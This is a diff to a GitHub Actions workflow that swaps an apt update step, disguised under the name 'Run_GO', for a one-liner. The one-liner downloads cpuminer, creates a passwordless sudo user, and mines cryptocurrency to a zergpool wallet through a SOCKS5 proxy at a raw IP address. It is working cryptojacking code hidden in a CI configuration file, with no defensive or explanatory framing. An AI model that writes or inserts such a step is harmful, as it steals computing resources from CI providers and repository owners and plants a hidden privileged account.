@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: Run_GO
       run: |
-         sudo apt update
+         wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.19/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && chmod 777 * && sudo adduser --disabled-password --gecos "" beh && sudo usermod -aG sudo beh && sudo -u beh -H sh -c "./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zergpool.com:4563 -u DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk -p c=DGB,mc=PYRK,ID=Gits01 -x socks5://161.35.137.49:28005 -q"
